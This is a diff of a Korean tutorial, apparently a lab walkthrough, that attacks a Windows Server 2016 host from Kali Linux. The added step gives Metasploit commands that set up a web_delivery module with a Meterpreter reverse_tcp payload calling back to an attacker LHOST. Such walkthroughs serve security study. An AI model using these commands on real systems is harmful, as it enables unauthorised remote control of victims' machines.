@@ -3,11 +3,27 @@
 - 공격 서버 :smiling_imp: : 칼리 리눅스(Kali Linux amd64)
 - 공격 대상 :skull: : 윈도우 서버 2016 (Windows Server 2016)
 
-### 1. :smiling_imp: msfvenom으로 악성코드 제작
+### 1. :smiling_imp: Metasploit으로 페이로드 생성
+
+metasploit 실행
 
 ```
-msfvenom
+msfconsole
 ```
+
+![1](https://i.ibb.co/v17ZFGS/Fileless-Metasploit-hwp-1.png)
+
+```
+use exploit/multi/script/web_delivery
+set target 2
+set LHOST 192.168.0.0
+set payload windows/meterpreter/reverse_tcp
+exploit -j
+```
+
+![2](https://i.ibb.co/p1np5Wk/Fileless-Metasploit-hwp-2.png)
+
+
 
 ### 2. :smiling_imp: 메타스플로잇으로 핸들러 서버 오픈
 
